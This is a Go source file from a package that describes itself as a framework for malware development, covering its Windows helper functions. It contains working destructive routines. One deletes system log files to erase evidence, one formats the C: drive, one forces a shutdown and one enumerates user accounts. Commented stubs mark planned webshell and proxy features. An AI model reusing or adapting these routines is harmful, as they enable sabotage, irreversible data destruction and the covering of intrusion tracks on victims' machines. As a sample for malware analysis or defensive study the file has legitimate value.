// Package coldfire is a framework that provides functions
// for malware development that are mostly compatible with
// Linux and Windows operating systems.
package coldfire

import (
	"os"
	"strings"
)

func shutdown() error {
	c := "shutdown -s -t 60"
	_, err := cmdOut(c)

	return err
}

func users() ([]string, error) {
	clear := []string{}
	o, err := cmdOut("net user")
	if err != nil {
		return nil, err
	}

	lines := strings.Split(o, "\n")

	for l := range lines {
		line := lines[l]
		if !ContainsAny(line, []string{"accounts for", "------", "completed"}) {
			clear = append(clear, line)
		}
	}

	return clear, nil
	// return strings.Fields(strings.Join(clear, " ")), nil
	// usrs := []string{}
	//   users, err := wapi.ListLoggedInUsers()
	//   if err != nil {
	//       return nil, err
	//   }
	//   for _, u := range(users){
	//       usrs = append(usrs, u.FullUser())
	//   }
	//   return usrs, nil
}

func clearLogs() error {
	os.Chdir("%windir%\\system32\\config")
	_, err := cmdOut("del *log /a /s /q /f")
	if err != nil {
		return err
	}

	return nil
}

func wipe() error {
	cmd := "format c: /fs:ntfs"
	_, err := cmdOut(cmd)
	if err != nil {
		return err
	}

	return nil
}

// func dialog(message, title string) {
// 	zenity.Info(message, zenity.Title(title))
// }

// func SplitMultiSep(s string, seps []string) []string {
// 	f := func(c rune) bool {
// 		for _, sep := range seps {
// 			if c == sep { // what?
// 				return true
// 			}
// 		}
// 	}
// 	fields := strings.FieldsFunc(s, f)
// 	return fields
// }

/*

func keyboard_emul(keys string) error {

}

func proxy_tcp() error {

}

func proxy_udp() error {

}

func proxy_http() error {

}

func webshell(param, password string) error {

}

func stamp() {

}

func detect_user_interaction() (bool, error) {

}*/
